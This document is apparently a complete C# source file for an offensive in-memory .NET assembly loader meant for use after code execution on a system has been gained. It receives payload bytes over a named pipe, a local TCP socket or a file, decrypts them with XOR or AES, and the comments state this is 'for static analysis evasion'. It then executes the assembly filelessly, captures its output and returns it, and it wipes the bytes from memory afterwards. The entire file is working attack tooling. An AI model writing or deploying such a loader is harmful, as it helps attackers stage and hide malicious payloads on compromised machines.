// Managed Assembly Loader — for use when you already have managed code execution
// This is the C# side: a loader that receives assembly bytes (e.g., over a named pipe,
// TCP socket, or from an encrypted embedded resource) and executes them in memory.
//
// Compile: csc /target:exe /platform:x64 assembly_loader.cs

using System;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace InMemoryLoader
{
    public class AssemblyLoader
    {
        // Core: Load and execute a .NET assembly from a byte array
        public static int Execute(byte[] assemblyBytes, string[] args)
        {
            try
            {
                Assembly assembly = Assembly.Load(assemblyBytes);
                MethodInfo entryPoint = assembly.EntryPoint;

                if (entryPoint == null)
                {
                    Console.Error.WriteLine("[-] No entry point found");
                    return 1;
                }

                // Handle both Main() and Main(string[]) signatures
                ParameterInfo[] parameters = entryPoint.GetParameters();
                object result;

                if (parameters.Length == 0)
                {
                    result = entryPoint.Invoke(null, null);
                }
                else
                {
                    result = entryPoint.Invoke(null, new object[] { args ?? new string[0] });
                }

                if (result is int exitCode)
                    return exitCode;

                return 0;
            }
            catch (TargetInvocationException ex)
            {
                Console.Error.WriteLine($"[-] Assembly threw: {ex.InnerException?.Message}");
                return 1;
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"[-] Load/Execute failed: {ex.Message}");
                return 1;
            }
        }

        // Execute with stdout/stderr capture — returns the output as a string
        // Useful when sending results back over a channel
        public static (int exitCode, string output) ExecuteWithCapture(byte[] assemblyBytes, string[] args)
        {
            TextWriter originalOut = Console.Out;
            TextWriter originalErr = Console.Error;

            using (var sw = new StringWriter())
            {
                Console.SetOut(sw);
                Console.SetError(sw);

                int exitCode = Execute(assemblyBytes, args);

                Console.SetOut(originalOut);
                Console.SetError(originalErr);

                return (exitCode, sw.ToString());
            }
        }

        // XOR decrypt — simple but effective for static analysis evasion
        public static byte[] XorDecrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        // AES decrypt for more serious payloads
        public static byte[] AesDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var decryptor = aes.CreateDecryptor())
                using (var ms = new MemoryStream(ciphertext))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var output = new MemoryStream())
                {
                    cs.CopyTo(output);
                    return output.ToArray();
                }
            }
        }
    }

    // Delivery mechanism: Named pipe listener
    // Waits for assembly bytes on a named pipe, then executes them
    public class PipeListener
    {
        public static void Listen(string pipeName, byte[] xorKey = null)
        {
            Console.WriteLine($"[*] Listening on pipe: {pipeName}");

            while (true)
            {
                using (var pipeServer = new NamedPipeServerStream(pipeName,
                    PipeDirection.InOut, 1, PipeTransmissionMode.Byte))
                {
                    pipeServer.WaitForConnection();

                    using (var ms = new MemoryStream())
                    {
                        // Protocol: [4 bytes: assembly length][N bytes: assembly][4 bytes: argc]
                        //           [for each arg: 4 bytes length + UTF8 string]
                        byte[] lenBuf = new byte[4];
                        pipeServer.Read(lenBuf, 0, 4);
                        int assemblyLen = BitConverter.ToInt32(lenBuf, 0);

                        byte[] assemblyBytes = new byte[assemblyLen];
                        int totalRead = 0;
                        while (totalRead < assemblyLen)
                        {
                            int read = pipeServer.Read(assemblyBytes, totalRead, assemblyLen - totalRead);
                            if (read == 0) break;
                            totalRead += read;
                        }

                        if (xorKey != null)
                            assemblyBytes = AssemblyLoader.XorDecrypt(assemblyBytes, xorKey);

                        // Read args
                        pipeServer.Read(lenBuf, 0, 4);
                        int argCount = BitConverter.ToInt32(lenBuf, 0);
                        string[] args = new string[argCount];

                        for (int i = 0; i < argCount; i++)
                        {
                            pipeServer.Read(lenBuf, 0, 4);
                            int argLen = BitConverter.ToInt32(lenBuf, 0);
                            byte[] argBytes = new byte[argLen];
                            pipeServer.Read(argBytes, 0, argLen);
                            args[i] = Encoding.UTF8.GetString(argBytes);
                        }

                        var (exitCode, output) = AssemblyLoader.ExecuteWithCapture(assemblyBytes, args);

                        // Send output back
                        byte[] outputBytes = Encoding.UTF8.GetBytes(output);
                        byte[] outputLen = BitConverter.GetBytes(outputBytes.Length);
                        pipeServer.Write(outputLen, 0, 4);
                        pipeServer.Write(outputBytes, 0, outputBytes.Length);
                        byte[] exitCodeBytes = BitConverter.GetBytes(exitCode);
                        pipeServer.Write(exitCodeBytes, 0, 4);
                    }
                }
            }
        }
    }

    // Delivery mechanism: TCP listener
    public class TcpListener
    {
        public static void Listen(int port, byte[] encryptionKey = null, byte[] iv = null)
        {
            var listener = new System.Net.Sockets.TcpListener(IPAddress.Loopback, port);
            listener.Start();
            Console.WriteLine($"[*] Listening on 127.0.0.1:{port}");

            while (true)
            {
                using (TcpClient client = listener.AcceptTcpClient())
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] lenBuf = new byte[4];
                    stream.Read(lenBuf, 0, 4);
                    int assemblyLen = BitConverter.ToInt32(lenBuf, 0);

                    byte[] assemblyBytes = new byte[assemblyLen];
                    int totalRead = 0;
                    while (totalRead < assemblyLen)
                    {
                        int read = stream.Read(assemblyBytes, totalRead, assemblyLen - totalRead);
                        if (read == 0) break;
                        totalRead += read;
                    }

                    if (encryptionKey != null && iv != null)
                        assemblyBytes = AssemblyLoader.AesDecrypt(assemblyBytes, encryptionKey, iv);

                    var (exitCode, output) = AssemblyLoader.ExecuteWithCapture(assemblyBytes, new string[0]);

                    byte[] outputBytes = Encoding.UTF8.GetBytes(output);
                    byte[] outputLen = BitConverter.GetBytes(outputBytes.Length);
                    stream.Write(outputLen, 0, 4);
                    stream.Write(outputBytes, 0, outputBytes.Length);
                }
            }
        }
    }

    // Demo entry point
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage:");
                Console.WriteLine("  assembly_loader.exe file <path_to_assembly> [args...]");
                Console.WriteLine("  assembly_loader.exe pipe <pipe_name>");
                Console.WriteLine("  assembly_loader.exe tcp <port>");
                return;
            }

            switch (args[0].ToLower())
            {
                case "file":
                    // Read assembly into memory then execute (demo only — replace the file
                    // read with your delivery mechanism)
                    byte[] assemblyBytes = File.ReadAllBytes(args[1]);
                    string[] assemblyArgs = new string[args.Length - 2];
                    Array.Copy(args, 2, assemblyArgs, 0, assemblyArgs.Length);

                    int result = AssemblyLoader.Execute(assemblyBytes, assemblyArgs);

                    // Wipe the byte array
                    Array.Clear(assemblyBytes, 0, assemblyBytes.Length);
                    Environment.Exit(result);
                    break;

                case "pipe":
                    PipeListener.Listen(args[1]);
                    break;

                case "tcp":
                    TcpListener.Listen(int.Parse(args[1]));
                    break;
            }
        }
    }
}
